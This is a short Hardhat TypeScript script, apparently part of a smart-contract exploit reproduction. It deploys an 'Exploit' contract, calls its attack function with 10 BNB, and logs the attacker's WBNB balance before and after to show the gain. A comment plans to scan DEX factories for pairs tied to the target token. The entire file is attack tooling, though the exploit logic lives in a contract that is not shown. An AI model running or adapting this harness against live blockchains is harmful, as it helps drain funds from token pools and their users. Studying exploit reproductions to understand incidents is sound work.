import {Exploit__factory, IERC20__factory} from "../typechain";
import hre, { ethers } from "hardhat"


//step 1 find all the pairs related to the token
//todo: interate all the DEX factory list and find all the token related pairs from factory


async function main() {
  const [signer] = await hre.ethers.getSigners();
  const exploit = await new Exploit__factory(signer).deploy();
  console.log("Exploit contract deployed to: ",exploit.address)
  const WBNB = IERC20__factory.connect("0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",signer);
  console.log("Attacker WBNB balance:", hre.ethers.utils.formatUnits(await WBNB.balanceOf(signer.address),await WBNB.decimals()))
  const exploitTx = await exploit.attack({value: ethers.utils.parseEther("10")});
  console.log("Exploiting... transcation: ",exploitTx.hash)
  await exploitTx.wait()
  console.log("Exploit complete.")
  console.log("Attacker WBNB balance:",hre.ethers.utils.formatUnits(await WBNB.balanceOf(signer.address),await WBNB.decimals()))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});